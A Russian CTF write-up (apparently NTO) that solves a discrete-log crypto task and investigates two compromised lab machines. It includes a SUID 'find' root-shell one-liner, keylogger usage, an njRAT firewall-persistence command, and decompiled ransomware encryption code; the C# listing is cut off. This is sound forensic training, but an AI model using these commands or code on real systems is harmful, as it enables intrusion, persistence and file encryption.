</div></div></code></pre><h2 id="Crypto-30" data-id="Crypto-30"><a class="anchor hidden-xs" href="#Crypto-30" title="Crypto-30"><span class="octicon octicon-link"></span></a><span>Crypto-30</span></h2><h4 id="Решение" data-id="Решение"><a class="anchor hidden-xs" href="#Решение" title="Решение"><span class="octicon octicon-link"></span></a><span>Решение</span></h4><p><span>Для решения данной задачи пригодилось использовать </span><a href="https://www.sagemath.org/" target="_blank" rel="noopener"><span>https://www.sagemath.org/</span></a><span> (сначала с ним возникали проблемы, т.к. на разных версиях могут не срабатывать некоторые модули)</span><br>
<span>По условию задания, можно понять, что мы имеем дело с проблемой </span><em><span>дискрет. алгоритма</span></em><span>, а значит нужно двигаться в эту сторону.</span><br>
<span>Хорошенько погуглив, находим информацию о существовании  </span><em><span>Pohlig hellman algorithm</span></em><span> (</span><a href="https://ru.wikipedia.org/wiki/%D0%90%D0%BB%D0%B3%D0%BE%D1%80%D0%B8%D1%82%D0%BC_%D0%9F%D0%BE%D0%BB%D0%B8%D0%B3%D0%B0_%E2%80%94_%D0%A5%D0%B5%D0%BB%D0%BB%D0%BC%D0%B0%D0%BD%D0%B0" target="_blank" rel="noopener"><span>https://ru.wikipedia.org/wiki/Алгоритм_Полига_—_Хеллмана</span></a><span>)</span><br>
<span>Понимаем, что здесь p-1, которое имеет только малые простые делители, оно также называется гладким числом.</span><br>
<span>Теперь можно взять дис. лог. таким образом.</span></p><p><span>Т.е. берем число p-1 и раскладываем его на множетели через библиотеку factordb (метод факторизации). Далее, берем дис. лог., т.к. множетели маленькие, а затем, через Chinese Remainder Theorem/CRT (Китайская теорема об остатках - </span><a href="https://math.fandom.com/ru/wiki/%D0%90%D0%BB%D0%B3%D0%BE%D1%80%D0%B8%D1%82%D0%BC_%D0%9F%D0%BE%D0%BB%D0%B8%D0%B3%D0%B0-%D0%A5%D0%B5%D0%BB%D0%BB%D0%BC%D0%B0%D0%BD%D0%B0" target="_blank" rel="noopener"><span>https://math.fandom.com/ru/wiki/Алгоритм_Полига-Хеллмана</span></a><span>) берем общий дис. лог.</span></p><p><span>П.С. - в коде есть комментарии, обозначающие, что означает та или иная функция (общее назначение)</span></p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span></div><div class="code"><span class="hljs-keyword">import</span> ast
<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes
<span class="hljs-keyword">from</span> factordb <span class="hljs-keyword">import</span> factordb
<span class="hljs-comment"># импорт библиотек</span>


<span class="hljs-keyword">def</span> <span class="hljs-title function_">read_ct</span>():
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'data.txt'</span>, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:
        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:
            <span class="hljs-keyword">yield</span> ast.literal_eval(line)
            <span class="hljs-comment"># открытие и чтение data.txt</span>

<span class="hljs-comment"># https://www.ctfnote.com/crypto/rsa/prime-factors</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">fdb</span>(<span class="hljs-params">x</span>):
    f = factordb.FactorDB(x)
    f.connect()
    <span class="hljs-comment"># коннект к фактору</span>
    <span class="hljs-keyword">return</span> f.get_factor_list()
    <span class="hljs-comment"># факторизация через базовый sage модкль</span>


<span class="hljs-keyword">def</span> <span class="hljs-title function_">dislog</span>(<span class="hljs-params">f, p, ct</span>):
    F = GF(p, proof=<span class="hljs-literal">False</span>)
    <span class="hljs-comment"># Galois field/Конечное поле</span>
    power = p // f
    <span class="hljs-comment"># целочисл. показат.</span>
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(discrete_log(F(ct)^power, F(<span class="hljs-number">2</span>)^power, <span class="hljs-built_in">ord</span>=f))
    <span class="hljs-comment"># дискретное логарифмирование</span>


<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    factors, results = [], []
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> read_ct():
        p, ct = x[<span class="hljs-string">'p'</span>], x[<span class="hljs-string">'shared_flag'</span>]
        <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> fdb(p-<span class="hljs-number">1</span>):
        <span class="hljs-comment"># те самые p-1</span>
            <span class="hljs-keyword">if</span> <span class="hljs-number">10</span> &lt;= f.bit_length() &lt; <span class="hljs-number">20</span>:
                <span class="hljs-built_in">print</span>(f)
                factors.append(f)
                results.append(dislog(f, p, ct))
    pt = crt(results, factors)
    <span class="hljs-comment"># Китайская теорема об остатках</span>
    <span class="hljs-built_in">print</span>(pt)
    <span class="hljs-built_in">print</span>(long_to_bytes(pt))
    <span class="hljs-comment"># мэйн функция с выводом результата</span>


<span class="hljs-keyword">if</span> name == <span class="hljs-string">'__main__'</span>:
    main()

</div></div></code></pre><p><strong><span>FLAG: nto{d0nt_k33p_secrets}</span></strong></p><h1 id="Машина-1" data-id="Машина-1"><a class="anchor hidden-xs" href="#Машина-1" title="Машина-1"><span class="octicon octicon-link"></span></a><span>Машина 1</span></h1><p><span>( Пароль с машины был снят изменением конфига граб (… init=/bin/sh) )</span></p><h2 id="Как-злоумышленник-попал-на-машину" data-id="Как-злоумышленник-попал-на-машину"><a class="anchor hidden-xs" href="#Как-злоумышленник-попал-на-машину" title="Как-злоумышленник-попал-на-машину"><span class="octicon octicon-link"></span></a><span>Как злоумышленник попал на машину?</span></h2><p><span>Благодаря легенде, можно узнать часть того пути, через которое была совершена атака. Ученик Валера взял флэшку у незнакомца под предлогом скачивания чита на всемирно известную игру Minecraft. Парень решил проверить работу программы на своем ПК, но не вышло, из-за чего он решил запустить ее на рабочем ПК своего отца. Тем не менее, это оказалось актом социальной инженерии: в лаунчере minecraft.jar был подшит реверсшел. (listener атакующего находился по адресу 192.167.126.129:4444)</span></p><h2 id="Как-повысил-свои-права" data-id="Как-повысил-свои-права"><a class="anchor hidden-xs" href="#Как-повысил-свои-права" title="Как-повысил-свои-права"><span class="octicon octicon-link"></span></a><span>Как повысил свои права?</span></h2><p><span>Чтобы найти следы хакерского ПО стоит, перейдя в машину, проверить все файлы, связанные с историями команд, логами программ и подозрительно выглядящими файлами. Они позволят определить цепочку атаки. Такие файлы и команды удалось обнаружить.</span></p><ol>
<li><a href="http://LinPEAS.sh" target="_blank" rel="noopener"><span>LinPEAS.sh</span></a><span> - скрипт, позволяющий обнаружить возможные пути повышения в системе.</span></li>
<li><span>SUID binary “find” - мисконфигурация машины, позволившая байпаснуть локальные правила и добиться повышения привилегий.</span></li>
</ol><pre><code>-rwsr-sr-x 1 root root 282088 Mar 23  2022 /usr/bin/find
sergey@ubuntu-2204:/usr/bin$ ./find . -exec /bin/sh -p \; -quit
# whoami
root
</code></pre><p><img src="https://i.imgur.com/7NMIeRb.png" alt="" loading="lazy"><br>
<img src="https://i.imgur.com/pTIk5Uh.png" alt="" loading="lazy"><br>
<img src="https://i.imgur.com/pUQ6Wye.png" alt="" loading="lazy"></p><ol start="3">
<li><span>содержимое файлов .bash_history</span></li>
</ol><pre><code>java -jar minecraft.jar - доказательство, что заражение началось с открытия лаунчера
./logkeys -m en_US_ubuntu_1204.map -s - запуск кейлоггера
cat /var/log/logkeys.log - путь, куда выгружались логи кейлоггера
</code></pre><p><span>Вывод: открыв файл, Валера запустил вредносное ПО, которое в свою очередь,</span><br>
<span>активировало реверс шелл и позволил осуществить бэк-коннект к системе отца героя. Далее, уже сам хакер попал в систему и воспользовался скриптом LinPEAS, чтобы увидеть мисконфиги и уязвимые точки системы. Удалось найти SUID find’а и повыситься до рута, имея все привилегии в пользовании.</span></p><pre><code>find / \( -perm -4000 -o -perm -2000 \) -type f -exec ls -la {} \; | grep find
-rwsr-sr-x 1 root root 282088 Mar 23  2022 /usr/bin/find
</code></pre><h2 id="Как-злоумышленник-узнал-пароль-от-passwordskdbx-" data-id="Как-злоумышленник-узнал-пароль-от-passwordskdbx-"><a class="anchor hidden-xs" href="#Как-злоумышленник-узнал-пароль-от-passwordskdbx-" title="Как-злоумышленник-узнал-пароль-от-passwordskdbx-"><span class="octicon octicon-link"></span></a><span>Как злоумышленник узнал пароль от passwords.kdbx ?</span></h2><p><span>Благодаря кейлоггеру у злоумышленника получилось выкрасть пароль от keepass, установленного на компьютере жертвы.</span></p><pre data-original-title="" title=""><code>Logging started ...
2023-02-10 07:56:02-0500 &gt; &lt;Enter&gt;1&lt;LShft&gt;_&lt;LShft&gt;D0&lt;LShft&gt;N7&lt;LShft&gt;_&lt;LShft&gt;N0&lt;LShft&gt;&lt;#+32&gt;&lt;LShft&gt;W&lt;LShft&gt;_&lt;LShft&gt;WHY&lt;LShft&gt;_N07&lt;LShft&gt;_M4y&lt;BckSp&gt;&lt;LShft&gt;Y83&lt;LShft&gt;_345&lt;LShft&gt;Y&lt;Up&gt;
</code></pre><p><span>Keepass password: </span><strong><span>1_D0N7_N0W_WHY_N07_M4Y83_345Y</span></strong></p><h2 id="Куда-logkeys-пишет-логи-" data-id="Куда-logkeys-пишет-логи-"><a class="anchor hidden-xs" href="#Куда-logkeys-пишет-логи-" title="Куда-logkeys-пишет-логи-"><span class="octicon octicon-link"></span></a><span>Куда logkeys пишет логи ?</span></h2><p><code>/var/log/logkeys.log</code><span> - путь, куда выгружались логи кейлоггера</span></p><p><span>ПРУФ ПУТИ ЛОГА</span><br>
<img src="https://i.imgur.com/mPBlJql.png" alt="" loading="lazy"><br>
<img src="https://i.imgur.com/VjJtCMs.png" alt="" loading="lazy"></p><h2 id="Пароль-от-чего-лежит-в-passwordskdbx" data-id="Пароль-от-чего-лежит-в-passwordskdbx"><a class="anchor hidden-xs" href="#Пароль-от-чего-лежит-в-passwordskdbx" title="Пароль-от-чего-лежит-в-passwordskdbx"><span class="octicon octicon-link"></span></a><span>Пароль от чего лежит в passwords.kdbx?</span></h2><p><span>В keepass находился пароль от некоторой windows машины, по видимому, с возможностью подключиться по rdp. Вероятно это обеспечило дальнейшее продвижение злоумышленника в сети жертвы. На скомпроментированной машине была надена Remina - по для RDP/VNC подключений.</span><br>
<span>Windows rdp password: </span><strong><span>SecretP@ss0rdMayby_0rNot&amp;</span></strong></p><p><span>.bash_history:</span></p><pre><code class="1 hljs"><span class="hljs-symbol">2 </span> ls /home/
<span class="hljs-symbol">3 </span> su root
<span class="hljs-symbol">4 </span> ls
<span class="hljs-symbol">5 </span> keepass2 
<span class="hljs-symbol">6 </span> keepass2
<span class="hljs-symbol">7 </span> ls
<span class="hljs-symbol">8 </span> java -jar minecraft.jar
</code></pre><p><span>root@ubuntu-2204:~# cat .bash_history</span></p><pre><code class="chmod hljs">ls <span class="hljs-operator">-</span>al <span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>bin<span class="hljs-operator">/</span>find
shred <span class="hljs-operator">/</span>root<span class="hljs-operator">/</span>.bash_history 
ls
cd Downloads<span class="hljs-operator">/</span>build<span class="hljs-operator">/</span>src<span class="hljs-operator">/</span>
ls
./logkeys 
./logkeys <span class="hljs-operator">-</span>k
cd ..
ls
cd src<span class="hljs-operator">/</span>
./logkeys <span class="hljs-operator">-</span>k
cat <span class="hljs-operator">/</span><span class="hljs-keyword">var</span><span class="hljs-operator">/</span>log<span class="hljs-operator">/</span>logkeys.log 
./logkeys <span class="hljs-operator">-</span>k
cat <span class="hljs-operator">/</span><span class="hljs-keyword">var</span><span class="hljs-operator">/</span>log<span class="hljs-operator">/</span>logkeys.log 
sudo apt<span class="hljs-operator">-</span>get install keepass2
keepass2 
userdel <span class="hljs-operator">-</span>r ubuntu
rm <span class="hljs-operator">-</span>rf <span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>ubuntu<span class="hljs-operator">/</span>
ls <span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>
lsusb 
cd Downloads<span class="hljs-operator">/</span>build<span class="hljs-operator">/</span>src<span class="hljs-operator">/</span>
ls
./logkeys <span class="hljs-operator">-</span>s
ls
cd ..
ls
cd src<span class="hljs-operator">/</span>
ls
./logkeys <span class="hljs-operator">-</span>s <span class="hljs-operator">-</span>u en_US_ubuntu_1204.map 
./logkeys
./logkeys <span class="hljs-operator">-</span>s <span class="hljs-operator">-</span>u en_US_ubuntu_1204.map 
./logkeys
./logkeys <span class="hljs-operator">-</span><span class="hljs-operator">-</span>us<span class="hljs-operator">-</span>keymap en_US_ubuntu_1204.map <span class="hljs-operator">-</span>s
./logkeys <span class="hljs-operator">-</span>m en_US_ubuntu_1204.map <span class="hljs-operator">-</span>s
exit
</code></pre><p><span>в загрузках был найден </span><a href="http://linpeas.sh" target="_blank" rel="noopener"><span>linpeas.sh</span></a></p><p><span>при открытии mi</span></p><p><img src="https://i.imgur.com/4U04R2K.png" alt="" loading="lazy"><br>
<img src="https://i.imgur.com/Dr76mXs.png" alt="" loading="lazy"></p><p><a href="https://etp.roseltorg.ru/authentication/login?url=/supplier/auction/index/status/31/proceduretypes/all" target="_blank" rel="noopener"><span>https://etp.roseltorg.ru/authentication/login?url=/supplier/auction/index/status/31/proceduretypes/all</span></a><br>
<span>это на</span></p><p><span>./logkeys -k</span><br>
<span>cat /var/log/logkeys.log</span><br>
<span>Благодаря кейлоггеру у злоумышленника получилось выкрасть пароль от keepass, установленного на компьютере жертвы.</span></p><p><span>Logging started …</span><br>
<span>2023-02-10 07:56:02-0500 &gt; </span>&lt;Enter&gt;<span>1</span>&lt;LShft&gt;<em>&lt;LShft&gt;<span>D0</span>&lt;LShft&gt;<span>N7</span>&lt;LShft&gt;</em>&lt;LShft&gt;<span>N0</span>&lt;LShft&gt;<span>&lt;#+32&gt;</span>&lt;LShft&gt;<span>W</span>&lt;LShft&gt;<span>_</span>&lt;LShft&gt;<span>WHY</span>&lt;LShft&gt;<span>_N07</span>&lt;LShft&gt;<span>_M4y</span>&lt;BckSp&gt;&lt;LShft&gt;<span>Y83</span>&lt;LShft&gt;<span>_345</span>&lt;LShft&gt;<span>Y</span>&lt;Up&gt;<br>
<span>2023-02-10 07:57:34-0500 &gt; </span>&lt;Enter&gt;</p><p><span>Keepass password: 1_D0N7_N0W_WHY_N07_M4Y83_345Y</span></p><p><span>Windows rdp password: SecretP@ss0rdMayby_0rNot&amp;</span></p><p><span>got root via suid find</span><br>
<span>-rwsr-sr-x 1 root root 282088 Mar 23  2022 /usr/bin/find</span></p><pre><code>sergey@ubuntu-2204:/usr/bin$ ./find . -exec /bin/sh -p \; -quit
# whoami
root
</code></pre><h1 id="Машина-2" data-id="Машина-2"><a class="anchor hidden-xs" href="#Машина-2" title="Машина-2"><span class="octicon octicon-link"></span></a><span>Машина 2</span></h1><p><a href="https://www.trendmicro.com/vinfo/ru/threat-encyclopedia/malware/trojan.msil.bladabindi.usxvpjv19" target="_blank" rel="noopener"><span>https://www.trendmicro.com/vinfo/ru/threat-encyclopedia/malware/trojan.msil.bladabindi.usxvpjv19</span></a><br>
<a href="https://xakep.ru/2018/11/28/bladabindi-worm/" target="_blank" rel="noopener"><span>https://xakep.ru/2018/11/28/bladabindi-worm/</span></a></p><p><img src="https://i.imgur.com/btw0HPU.jpg" alt="" loading="lazy"><br>
<img src="https://i.imgur.com/siDPmgI.png" alt="" loading="lazy"></p><p><a href="https://www.virustotal.com/gui/file/adf5ca9b1582c69c8833bc611166d6388216c5e7f570bbf9298fd60c37bf72a6/detection" target="_blank" rel="noopener"><span>https://www.virustotal.com/gui/file/adf5ca9b1582c69c8833bc611166d6388216c5e7f570bbf9298fd60c37bf72a6/detection</span></a></p><h2 id="Какой-пароль-от-Ransomware" data-id="Какой-пароль-от-Ransomware"><a class="anchor hidden-xs" href="#Какой-пароль-от-Ransomware" title="Какой-пароль-от-Ransomware"><span class="octicon octicon-link"></span></a><span>Какой пароль от Ransomware?</span></h2><p><span>Config.key = “WhenYoullComeHomeIllStopThis”</span><br>
<span>Config.User = “NTI-User”</span><br>
<span>Config.IP = 6 7^:'8Z :V\u001A&lt;\u0010!]?\u001E&amp;\u001C1\u001DZ\u001A6ZY\u00054\u0005#]\u0015^/?\r-541\u0010:\u0015"</span><br>
<span>password = “</span><strong><span>084b988baa7c8d98cda90c5fe603c560</span></strong><span>”</span></p><h2 id="Какие-процессы-в-системе-являются-вредоносными" data-id="Какие-процессы-в-системе-являются-вредоносными"><a class="anchor hidden-xs" href="#Какие-процессы-в-системе-являются-вредоносными" title="Какие-процессы-в-системе-являются-вредоносными"><span class="octicon octicon-link"></span></a><span>Какие процессы в системе являются вредоносными?</span></h2><p><span>njRAT — троян удаленного доступа. Это один из самых доступных и известных старых RAT. Заинтересованные злоумышленники могут найти целые учебные пособия на YouTube.</span><br>
<span>О принадлежности этого трояна к njRAT говорит множество сигнатурных анализаторов и песочницы.</span><br>
<span>Так выглядит графовая структура процессов, созадваемых после запуска Doom.exe</span><br>
<img src="https://i.imgur.com/NiP3tYV.png" alt="" loading="lazy"><br>
<span>Таким образом вредоносными являются:</span></p><pre><code>1.Host Process for Windows Tasks.exe
2.Runtime Broker.exe
3.Security Health Service.exe
4.Windows Explorer.exe
</code></pre><p><span>Исполняемые файлы находятся соответственно по путям:</span></p><pre><code>C:\Users\admin\Security Health Service.exe
C:\ProgramData\Windows Explorer.exe
C:\Users\admin\AppData\Local\Temp\Runtime Broker.exe
C:\Users\admin\Security Health Service.exe
</code></pre><p><strong><span>Один из экземпляров njRAT находится по пути C:\Users\Administrator\Desktop1.exe</span></strong></p><p><span>После дропа и инициализации, каждый из процессов обеспечивает себе доступ во внешнюю сеть, разрешая подключения для себя в фаерволе windows.</span><br>
<span>Пример:</span><br>
<code>netsh firewall add allowedprogram "C:\Users\admin\AppData\Roaming\Host Process for Windows Tasks.exe" "Host Process for Windows Tasks.exe" ENABLE</code></p><h2 id="Как-произошла-доставка-вредоносного-ПО" data-id="Как-произошла-доставка-вредоносного-ПО"><a class="anchor hidden-xs" href="#Как-произошла-доставка-вредоносного-ПО" title="Как-произошла-доставка-вредоносного-ПО"><span class="octicon octicon-link"></span></a><span>Как произошла доставка вредоносного ПО?</span></h2><p><span>С прошлого этапа злоумышленник получил доступ по RDP к атакуемой windows машине, после чего загрузил и запустил VTropia.exe. Таким образом он зашифровал некоторые файлы(не всех форматов, не во всех директориях) на атакуемой машине. Через некоторое время, был загружен Doom.exe, который является дроппером njRAT и открывает постоянный удалённый доступ, так он обеспечил себе закрепление на атакуемом компьютере, корме того так он повысил свою скрытность, так как теперь он больше не зависит от незанятой RDP сессии.</span><br>
<a href="https://support.microsoft.com/en-us/windows/how-malware-can-infect-your-pc-872bf025-623d-735d-1033-ea4d456fb76b" target="_blank" rel="noopener"><span>https://support.microsoft.com/en-us/windows/how-malware-can-infect-your-pc-872bf025-623d-735d-1033-ea4d456fb76b</span></a></p><h2 id="Какие-средства-обфускации-были-использованы" data-id="Какие-средства-обфускации-были-использованы"><a class="anchor hidden-xs" href="#Какие-средства-обфускации-были-использованы" title="Какие-средства-обфускации-были-использованы"><span class="octicon octicon-link"></span></a><span>Какие средства обфускации были использованы?</span></h2><p><span>Eziriz net reactor</span><br>
<img src="https://i.imgur.com/yAGv0VG.png" alt="" loading="lazy"></p><p><span>Деобфусцируем</span><br>
<img src="https://i.imgur.com/HSP6l2u.png" alt="" loading="lazy"></p><h2 id="Как-злоумышленник-нашел-учетные-данные-от-Web-сервиса" data-id="Как-злоумышленник-нашел-учетные-данные-от-Web-сервиса"><a class="anchor hidden-xs" href="#Как-злоумышленник-нашел-учетные-данные-от-Web-сервиса" title="Как-злоумышленник-нашел-учетные-данные-от-Web-сервиса"><span class="octicon octicon-link"></span></a><span>Как злоумышленник нашел учетные данные от Web-сервиса?</span></h2><p><span>В файлах сессии основного браузера на машине были обнаружены попытки просмотреть сохраненные пароли и формы ввода.</span></p><p><img src="https://i.imgur.com/mH5aXqO.png" alt="" loading="lazy"><br>
<span>Именно там он и обнаружил сохраненный пароль для веб сайта. Однако, после шифрования системы мы не смогли сразу увидеть эти сохраненные данные, так как они тоже были затронуты шифровальщиком</span></p><pre><code>chrome://settings/autofill
chrome://settings/passwords
</code></pre><p><span>Найденный пароль </span><strong><span>P@ssw0rd</span></strong></p><p><img src="https://i.imgur.com/HyFLFNd.png" alt="" loading="lazy"></p><p><img src="https://i.imgur.com/0M5krU4.png" alt="" loading="lazy"></p><p><span>МИКРОТИК</span><br>
<span>Рядом с утилитой для настройки роутеров Mikrotik был найден файл Important.txt.txt. Вероятнее всего пароль содержащийся в текстовом файле был связан с утилитой.</span><br>
<code>CSh4RpR@n50mWar3z4ReSti11Us3fUl</code></p><p><span>Доказательство, что на компьютере запускалась vtropia.exe</span><br>
<img src="https://i.imgur.com/yORQ1mf.png" alt="" loading="lazy"></p><p><span>Скрипт для декрипта файлов:</span></p><p><img src="https://i.imgur.com/yCFxLij.png" alt="" loading="lazy"></p><pre><code>    byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] array = Encoding.UTF8.GetBytes(password);
			array = SHA256.Create().ComputeHash(array);
			byte[] bytes = Crypt.AES_Encrypt(bytesToBeEncrypted, array);
			try
			{
				File.WriteAllBytes(file, bytes);
				string str = ".p4blm";
				File.Move(file, file + str);
			}
			catch (UnauthorizedAccessException)
			{
</code></pre><pre><code class="csharp hljs"><div class="wrapper"><div class="gutter linenumber"><span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span></div><div class="code"><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Security<span class="token punctuation">.</span>Cryptography</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>IO</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">C</span> <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> <span class="token function">AES_Encrypt</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> bytesToBeEncrypted<span class="token punctuation">,</span> <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> passwordBytes<span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> result <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
			<span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> salt <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span>
			<span class="token punctuation">{</span>
				<span class="token number">1</span><span class="token punctuation">,</span>
				<span class="token number">8</span><span class="token punctuation">,</span>
				<span class="token number">3</span><span class="token punctuation">,</span>
				<span class="token number">6</span><span class="token punctuation">,</span>
				<span class="token number">2</span><span class="token punctuation">,</span>
				<span class="token number">4</span><span class="token punctuation">,</span>
				<span class="token number">9</span><span class="token punctuation">,</span>
				<span class="token number">7</span>
			<span class="token punctuation">}</span><span class="token punctuation">;</span>
			<span class="token keyword">using</span> <span class="token punctuation">(</span><span class="token class-name">MemoryStream</span> memoryStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">MemoryStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token punctuation">{</span>
				<span class="token keyword">using</span> <span class="token punctuation">(</span><span class="token class-name">RijndaelManaged</span> rijndaelManaged <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">RijndaelManaged</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
				<span class="token punctuation">{</span>
					rijndaelManaged<span class="token punctuation">.</span>KeySize <span class="token operator">=</span> <span class="token number">256</span><span class="token punctuation">;</span>
					rijndaelManaged<span class="token punctuation">.</span>BlockSize <span class="token operator">=</span> <span class="token number">128</span><span class="token punctuation">;</span>
					<span class="token class-name">Rfc2898DeriveBytes</span> rfc2898DeriveBytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">Rfc2898DeriveBytes</span><span class="token punctuation">(</span>passwordBytes<span class="token punctuation">,</span> salt<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					rijndaelManaged<span class="token punctuation">.</span>Key <span class="token operator">=</span> rfc2898DeriveBytes<span class="token punctuation">.</span><span class="token function">GetBytes</span><span class="token punctuation">(</span>rijndaelManaged<span class="token punctuation">.</span>KeySize <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					rijndaelManaged<span class="token punctuation">.</span>IV <span class="token operator">=</span> rfc2898DeriveBytes<span class="token punctuation">.</span><span class="token function">GetBytes</span><span class="token punctuation">(</span>rijndaelManaged<span class="token punctuation">.</span>BlockSize <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					rijndaelManaged<span class="token punctuation">.</span>Mode <span class="token operator">=</span> CipherMode<span class="token punctuation">.</span>CBC<span class="token punctuation">;</span>
					<span class="token keyword">using</span> <span class="token punctuation">(</span><span class="token class-name">CryptoStream</span> cryptoStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">CryptoStream</span><span class="token punctuation">(</span>memoryStream<span class="token punctuation">,</span> rijndaelManaged<span class="token punctuation">.</span><span class="token function">CreateEncryptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> CryptoStreamMode<span class="token punctuation">.</span>Write<span class="token punctuation">)</span><span class="token punctuation">)</span>
					<span class="token punctuation">{</span>
						cryptoStream<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>bytesToBeEncrypted<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bytesToBeEncrypted<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>
						cryptoStream<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token punctuation">}</span>
					result <span class="token operator">=</span> memoryStream<span class="token punctuation">.</span><span class="token function">ToArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
			<span class="token punctuation">}</span>
			<span class="token keyword">return</span> result<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
    
        <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> <span class="token function">AES_Decrypt</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> bytesToBeEncrypted<span class="token punctuation">,</span> <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> passwordBytes<span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> result <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
			<span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> salt <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span>
			<span class="token punctuation">{</span>
				<span class="token number">1</span><span class="token punctuation">,</span>
				<span class="token number">8</span><span class="token punctuation">,</span>
				<span class="token number">3</span><span class="token punctuation">,</span>
				<span class="token number">6</span><span class="token punctuation">,</span>
				<span class="token number">2</span><span class="token punctuation">,</span>
				<span class="token number">4</span><span class="token punctuation">,</span>
				<span class="token number">9</span><span class="token punctuation">,</span>
				<span class="token number">7</span>
			<span class="token punctuation">}</span><span class="token punctuation">;</span>
